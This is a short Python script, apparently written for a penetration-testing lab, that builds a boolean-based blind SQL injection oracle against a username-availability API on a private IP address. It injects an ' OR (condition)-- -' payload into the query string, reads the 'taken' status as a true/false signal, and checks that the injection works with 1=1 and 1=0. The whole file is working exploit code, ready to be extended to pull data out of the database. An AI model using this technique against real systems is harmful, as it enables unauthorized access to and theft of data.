#!/usr/bin/python3
import json,sys,requests
from urllib.parse import quote_plus

target = "test"

def oracle(a):
    p = quote_plus(f"{target}' OR ({a})-- -")
    r = requests.get(f"http://10.129.204.197/api/check-username.php?u={p}")
    j = json.loads(r.text)
    return j['status'] == 'taken'

assert oracle("1=1")
assert not oracle("1=0")

